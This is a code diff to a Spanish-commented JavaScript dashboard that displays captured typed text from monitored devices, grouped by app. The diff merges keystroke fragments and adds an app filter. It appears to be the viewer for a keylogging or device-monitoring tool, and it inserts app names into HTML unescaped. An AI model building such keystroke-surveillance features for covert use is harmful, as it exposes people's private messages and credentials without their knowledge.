@@ -759,31 +759,101 @@
     } catch (e) {}
   }
 
+  let allTypingRecords = [];
+
+  function renderTypingTable() {
+    typingTable.innerHTML = '';
+    const filterSelect = document.getElementById('typingAppFilter');
+    const selectedApp = (filterSelect?.value || '').trim();
+    let total = 0;
+
+    const filtered = selectedApp 
+      ? allTypingRecords.filter(r => r.app === selectedApp)
+      : allTypingRecords;
+
+    filtered.forEach((item) => {
+      total++;
+      const tr = document.createElement('tr');
+      tr.style.cursor = 'pointer';
+      const time = item.ts ? new Date(item.ts).toLocaleTimeString() : '—';
+      const preview = item.text.length > 90 ? item.text.slice(0, 90) + '...' : item.text;
+      tr.innerHTML = `
+        <td style="white-space:nowrap;">${time}</td>
+        <td><span class="badge-tag" style="background:rgba(59,130,246,0.15); color:#60a5fa; border:1px solid rgba(59,130,246,0.3);">${item.app}</span></td>
+        <td style="font-family:monospace; color:#93c5fd; word-break:break-word;">${escapeHtml(preview)}</td>
+      `;
+      tr.addEventListener('click', () => {
+        typingModalTitle.textContent = `${item.app} (${time})`;
+        typingLog.textContent = item.text;
+        typingModal.classList.remove('hidden');
+      });
+      typingTable.appendChild(tr);
+    });
+
+    noTyping.classList.toggle('hidden', total > 0);
+  }
+
+  const typingAppFilter = document.getElementById('typingAppFilter');
+  if (typingAppFilter) {
+    typingAppFilter.addEventListener('change', () => {
+      renderTypingTable();
+    });
+  }
+
   async function loadTyping() {
     try {
       const data = await api(`/api/typing?date=${typingDate.value}`);
-      typingTable.innerHTML = '';
-      let total = 0;
+      allTypingRecords = [];
+      const appSet = new Set();
+
       for (const [dev, list] of Object.entries(data)) {
-        list.slice().reverse().forEach((item) => {
-          total++;
-          const tr = document.createElement('tr');
-          const time = item.ts ? item.ts.slice(11, 19) : '—';
-          const preview = item.text.length > 90 ? item.text.slice(0, 90) + '...' : item.text;
-          tr.innerHTML = `
-            <td>${time}</td>
-            <td><span class="badge-tag">${item.app}</span></td>
-            <td style="font-family:monospace; color:#60a5fa;">${escapeHtml(preview)}</td>
-          `;
-          tr.addEventListener('click', () => {
-            typingModalTitle.textContent = `${item.app} (${time})`;
-            typingLog.textContent = item.text;
-            typingModal.classList.remove('hidden');
-          });
-          typingTable.appendChild(tr);
+        // Consolidar fragmentos de pulsaciones consecutivas en la misma app
+        const consolidated = [];
+        list.forEach((item) => {
+          if (!item.text || !item.text.trim()) return;
+          appSet.add(item.app);
+          const prev = consolidated[consolidated.length - 1];
+          const prevTime = prev ? new Date(prev.ts).getTime() : 0;
+          const currTime = item.ts ? new Date(item.ts).getTime() : 0;
+          const timeDiff = Math.abs(currTime - prevTime);
+
+          // Si es la misma app y ocurrio en un lapso corto (< 6s) y uno contiene al otro
+          if (prev && prev.app === item.app && timeDiff < 6000 && (item.text.startsWith(prev.text) || prev.text.startsWith(item.text))) {
+            if (item.text.length >= prev.text.length) {
+              prev.text = item.text;
+            }
+            prev.ts = item.ts;
+          } else {
+            consolidated.push({
+              app: item.app,
+              title: item.title,
+              text: item.text,
+              ts: item.ts
+            });
+          }
         });
+
+        allTypingRecords = allTypingRecords.concat(consolidated.reverse());
       }
-      noTyping.classList.toggle('hidden', total > 0);
+
+      // Actualizar opciones del dropdown de apps
+      const filterSelect = document.getElementById('typingAppFilter');
+      if (filterSelect) {
+        const currentVal = filterSelect.value;
+        filterSelect.innerHTML = '<option value="">📱 Todas las apps</option>';
+        Array.from(appSet).sort().forEach(app => {
+          const opt = document.createElement('option');
+          opt.value = app;
+          const cleanName = app.split('.').pop() || app;
+          opt.textContent = `📱 ${cleanName} (${app})`;
+          filterSelect.appendChild(opt);
+        });
+        if (currentVal && appSet.has(currentVal)) {
+          filterSelect.value = currentVal;
+        }
+      }
+
+      renderTypingTable();
     } catch (e) {}
   }
 
